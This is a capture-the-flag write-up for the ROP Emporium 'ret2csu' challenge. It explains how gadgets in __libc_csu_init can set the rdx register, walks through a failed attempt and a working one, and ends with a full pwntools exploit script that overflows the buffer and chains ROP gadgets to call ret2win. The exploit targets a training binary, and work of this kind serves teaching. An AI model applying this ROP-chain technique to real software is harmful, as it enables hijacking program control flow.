# Ret2csu
This challenge is a follow-up to the [callme](https://github.com/TSpeel/writeups/blob/main/pwn/ROPEmporium3_callme/README.md) challenge.
We need to call `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`, but don't have an easy gadget to set `rdx` (the third argument).

Instead, we have to use the ret2csu technique. 
This technique is introduced in this [paper](https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf), but this [article](https://ir0nstone.gitbook.io/notes/binexp/stack/ret2csu) summarizes it pretty well.
The idea is that when a binary is compiled dynamically, some functions are added to link libc.
This contains the function `__libc_csu_init`, which contains the following gadget:
```
00400680 4c 89 fa        MOV        RDX,R15
00400683 4c 89 f6        MOV        RSI,R14
00400686 44 89 ef        MOV        EDI,R13D
00400689 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]=>->frame_dummy   

0040068d 48 83 c3 01     ADD        RBX,0x1
00400691 48 39 dd        CMP        RBP,RBX
00400694 75 ea           JNZ        LAB_00400680

00400696 48 83 c4 08     ADD        RSP,0x8
0040069a 5b              POP        RBX
0040069b 5d              POP        RBP
0040069c 41 5c           POP        R12
0040069e 41 5d           POP        R13
004006a0 41 5e           POP        R14
004006a2 41 5f           POP        R15
004006a4 c3              RET
```
This can be used from `0x40069a` to pop to some registers, and can be used from the start `0x400680` to perform a `call` instruction.

## First attempt
My first idea was to use a `pop rdi` gadget to set `rdi` to `0xdeadbeefdeadbeef`, and then use the pop gadget at `0x40069a` to set `r14` to `0xcafebabecafebabe` and `r15` to `0xd00df00dd00df00d`.
Then we can use the call gadget at `0x400680` to move the contents of `r14` and `r15` into `rsi` and `rdx`, and call `ret2win()`.

The problem is that the lowest 32 bits of `r13` are moved into `edi` with `00400686 44 89 ef MOV EDI,R13D`.
I thought I could simply put `0xdeadbeef` in `r13` and only overwrite the lowest half of `rdi`, but this `mov` actually zeroes out the top 32 bits of `rdi`.
This means calling `ret2win()` in this way sets `rdi` to the wrong value. 

## Second attempt
We cannot use the `call` instruction from the csu gadget to call `ret2win()`, but we do still need to use the gadget to set `rdx`.
We can take the same approach as earlier to set `rsi` and `rdx`, but supply a function that does nothing to the `call` instruction, so that the gadget continues after calling the do-nothing function.
Then we can simply return back to our rop chain and set `rdi` with a pop gadget and return to `ret2win()` manually.

I first tried to use the function `frame_dummy()` for this, but this did not work. When I tried again with the `_init()` function, it worked!

The final exploit code is as follows:
```
#!/usr/bin/env python3

from pwn import *
import subprocess


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


"""
notes:

"""

gdbscript = ""

breakpoints = [
    #    'breakrva 0xoffset',
    #"continue"
]

for s in breakpoints:
    gdbscript += s + "\n"


exe = "./ret2csu"
elf = context.binary = ELF(exe, checksec=False)
# context.log_level = 'info' # use DEBUG in args for debugging. LOG_LEVEL=warn/info/error for anything else

"""
if args.REMOTE:
    libc = ELF('./libc.so.6', checksec=False)
else:
    libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
"""

# ===========================================================
#                    EXPLOIT STARTS HERE
# ===========================================================
io = start()

"""
00400680 4c 89 fa        MOV        RDX,R15
00400683 4c 89 f6        MOV        RSI,R14
00400686 44 89 ef        MOV        EDI,R13D
00400689 41 ff 14 dc     CALL       qword ptr [R12 + RBX*0x8]=>->frame_dummy   

0040068d 48 83 c3 01     ADD        RBX,0x1
00400691 48 39 dd        CMP        RBP,RBX
00400694 75 ea           JNZ        LAB_00400680

00400696 48 83 c4 08     ADD        RSP,0x8
0040069a 5b              POP        RBX
0040069b 5d              POP        RBP
0040069c 41 5c           POP        R12
0040069e 41 5d           POP        R13
004006a0 41 5e           POP        R14
004006a2 41 5f           POP        R15
004006a4 c3              RET
"""
csu_callgadget = 0x400680
csu_popgadget  = 0x40069a
pop_rdi        = 0x4006a3
ret2win_plt    = 0x400510

arg_one   = 0xdeadbeefdeadbeef # must go in rdi
arg_two   = 0xcafebabecafebabe # must go in rsi
arg_three = 0xd00df00dd00df00d # must go in rdx

#frame_dummy does not work
init_got = 0x600e38


payload = b"A" * 40

payload += p64(csu_popgadget)
payload += p64(0)         # rbx (0 for call)
payload += p64(1)         # rbp (for comparison CMP RBP,RBX)
payload += p64(init_got)  # call do nothing
payload += p64(0)         # r13 (edi, garbage)
payload += p64(arg_two)   # r14 (rsi)
payload += p64(arg_three) # r15 (rdx)


payload += p64(csu_callgadget)
# supply some garbage values
payload += p64(0) # add
payload += p64(0) # rbx
payload += p64(0) # rbp
payload += p64(0) # r12
payload += p64(0) # r13
payload += p64(0) # r14
payload += p64(0) # r15

# set rdi and call ret2win
payload += p64(pop_rdi)
payload += p64(arg_one)
payload += p64(ret2win_plt)

io.sendlineafter(b">", payload)
io.interactive()
```

